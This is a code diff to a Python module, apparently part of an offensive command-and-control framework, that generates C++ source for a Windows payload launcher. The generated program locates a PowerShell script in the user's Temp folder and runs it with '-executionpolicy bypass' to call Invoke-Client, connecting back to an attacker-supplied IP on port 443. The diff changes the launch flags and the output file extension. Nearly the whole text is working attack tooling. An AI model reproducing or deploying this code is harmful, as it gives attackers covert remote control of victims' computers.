@@ -58,8 +58,8 @@ class executing_payload(Module):
 		#pragma comment(lib, "urlmon.lib")
 		#include <lmcons.h>
 		#include <cstring>
-		#define PSSCRIPT "%s"
-		#define IPADDR "%s"
+		#define PSSCRIPT "%%s"
+		#define IPADDR "%%s"
 		using namespace std;
 
 		int main(void){
@@ -70,12 +70,12 @@ class executing_payload(Module):
 		       GetUserName(username, &username_len);
 		       string user(username);      
 		       string ruta_script = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + nombre_script;
-		       string strCMD = "start powershell.exe -noprofile -windowstyle hidden -Command "\\&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\";
+		       string strCMD = "start powershell.exe -executionpolicy bypass -Command "\\\\&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\\";
 		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.
 
 		}
 		''' % (c2client, ipaddr)
 
-		f = open(name+".c","w")
+		f = open(name+".cpp","w")
 		f.write(STARTC2)
 		print("File "+name+" created.")
